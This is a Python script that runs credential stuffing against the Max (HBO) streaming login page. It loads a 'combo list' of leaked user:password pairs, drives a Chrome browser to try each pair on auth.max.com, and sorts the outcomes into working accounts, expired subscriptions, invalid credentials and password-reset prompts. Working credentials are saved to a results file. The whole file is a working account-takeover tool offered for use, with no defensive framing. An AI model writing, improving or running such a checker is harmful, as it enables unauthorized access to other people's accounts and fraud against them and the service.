import time
import os
import requests
from pyshadow.main import Shadow
from modules.connection_error import connection_error_try_block as connection_error
from bs4 import BeautifulStoneSoup as soup
from headers.hbo_header import header
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, \
    InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

header()
file_directory = str(Path(__file__).parent) + '/hbo'
page = 'https://auth.max.com/login'
users = []
passwords = []
browser_options = Options()
browser_options.add_argument = (
    'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 '
    'Safari/537.36')
#browser_options.headless = True
os.makedirs('accounts', exist_ok=True)
try:
    with open(file_directory, 'r') as hbo:
        for line in hbo.readlines():
            users.append(line.split(':')[0].strip())
            passwords.append(line.split(':')[1].split(" ")[0])
except FileNotFoundError as file_not_found:
    print("\x1bc")
    print("There is no combo list in directory: " + str(Path(__file__).parent))
    print("\nPlease make sure you have an existing combo-list named 'hbo'")
    print("\nprior to running the program.")
    print("\n\nEnding.")
    exit()
except IndexError as out_of_range:
    print("Combo-list Formatting Error.\n")
    print("Please check:\n")
    print("1) There are no extra spaces at the bottom of the file.")
    print("2) There is no extra information at the top of the file (such as Ascii art).")
    print("3) There is anything else which might interfere with string parsing,\n"
          "other than traditional 'user:password' combinations.\n")
    print("Ending.")
    exit()

index = 0

while index != len(users):
    with open('accounts/hbo_working_accounts', 'a') as account_results:
        try:
            print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
            browser = webdriver.Chrome(options=browser_options)
            browser.set_window_size(500, 700)
            browser.get(page)
            time.sleep(6)
            shadows = Shadow(browser)
            email_box = shadows.find_element('input[id="login-username-input"]')
            password_box = shadows.find_element('input[id="login-password-input"]')
            sign_in_button = shadows.find_element('button[type="submit"]')
            time.sleep(3)
            email_box.send_keys(users[index])
            password_box.send_keys(passwords[index])
            time.sleep(2)
            sign_in_button.click()
            time.sleep(6)
            if browser.find_elements(By.XPATH, '//*[@id="app"]/div[1]/div/div/div/div[2]/div/section/h1'):
                print(' | {}:{} ---> Success!'.format(users[index], passwords[index]))
                account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))

            if browser.find_elements(By.XPATH, '//*[@id="page6097-band3130-Button32105"]'):
                print(' | {}:{} ---> Sub Expired'.format(users[index], passwords[index]))

            if shadows.find_elements('div[class="notification-message"]'):
                print(' | {}:{} ---> Invalid Credentials'.format(users[index], passwords[index]))

            if shadows.find_elements("gi-compromised-password[class='hydrated']"):
                print(' | {}:{} ---> Password Reset Dialog'.format(users[index], passwords[index]))
            index += 1
        except Exception as e:
            print(e)
            exit()
